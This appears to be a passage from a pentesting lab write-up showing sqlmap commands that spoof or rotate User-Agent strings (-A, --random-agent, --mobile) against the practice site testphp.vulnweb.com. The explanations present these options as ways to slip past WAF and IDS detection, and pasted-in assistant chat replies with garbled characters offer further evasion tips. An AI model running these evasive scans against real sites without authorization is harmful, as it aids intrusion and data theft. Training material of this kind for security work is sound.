- `sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" -A "Mozilla/5.0"` : This makes the request appear as if it came from a normal browser, helping to bypass filters that block "unknown" or automated tools.

üîç Explanation for You as a Pentester
- User-Agent Basics:
Every HTTP request from a browser includes a User-Agent string like "Mozilla/5.0 (Windows NT 10.0; Win64; x64)". It tells the server what kind of browser and OS you're using.
- Why It Matters in Pentesting:
Security tools like WAFs often block requests that look suspicious‚Äîespecially those coming from automated tools like SQLMAP. If SQLMAP sends its default User-Agent, it might get flagged or blocked.
- The -A Option in SQLMAP:
This lets you spoof the User-Agent to mimic a real browser. For example:
````
-A "Mozilla/5.0"
````
- This tricks the server into thinking the request is coming from a regular user, not a scanner.
- Real-World Use Case:
When testing a target behind Cloudflare or ModSecurity, using a browser-like User-Agent can help you slip past basic filters and get your payload through.

Want me to show you how to combine this with other evasion techniques like --random-agent, --headers, or tamper scripts? I can also help you document this in your GitHub portfolio with a clean markdown snippet and screenshot layout.




#### Random agent 


````
sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent --batch --dbs
````
<img width="1895" height="788" alt="image" src="https://github.com/user-attachments/assets/4210a8ba-0029-4d9e-adce-307134d06d91" />

`--random-agent` Instead of setting a fixed User-Agent manually, SQLMAP has a built-in list of common User-Agents. With `--random-agent` , SQLMAP will randomly choose one for each request.

- `sqlmap -u "http://testphp.vulnweb.com/listproducts.php?cat=1" --random-agent`  : This is useful when scanning targets that monitor traffic patterns. If every request uses the same User-Agent, it looks suspicious. By rotating them, we can avoid basic detection and appear more like genuine traffic.

üîç Why This Matters for You
- Traffic Fingerprinting:
Some WAFs and IDSs don‚Äôt just block based on payload‚Äîthey analyze traffic patterns. If every request has the same User-Agent, it screams ‚Äúautomated tool.‚Äù
- Built-in Rotation:
SQLMAP‚Äôs --random-agent pulls from a curated list of real-world User-Agent strings (Chrome, Firefox, Safari, etc.). Each request looks like it came from a different browser.
- Evasion Strategy:
This is a lightweight obfuscation tactic. It won‚Äôt bypass advanced behavioral analysis, but it‚Äôs great for dodging basic filters and logging systems that flag repetitive headers.
- When to Use:
- During recon or low-risk probing
- Against targets with basic WAFs
- When you want to reduce your footprint without crafting custom headers

üß† Pro Tip for Your Portfolio
Document both -A and --random-agent in your GitHub lab reports. Include:
- A short explanation of each
- Screenshots of intercepted requests (e.g., Burp Suite showing rotated User-Agents)
- A note on when and why you chose each option
Want help drafting that markdown section or organizing your folders for SQL injection labs? I can whip up a clean template for you.





#### Mobile
````
sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --mobile -v5
````
<img width="1199" height="779" alt="image" src="https://github.com/user-attachments/assets/a44a5d17-e205-406f-ae75-3ec6a36dcfb9" />

- `--mobile` Some websites deliver different content based on whether the user is on a desktop or mobile device. The `--mobile` option allows SQLMAP to send requests with a mobile browser User-Agent, such as Android Chrome or iPhone Safari.
- `sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=2" --mobile` :  This can reveal vulnerabilities that are only visible in the mobile version of the site. Attackers often look for weak points in mobile-specific endpoints.














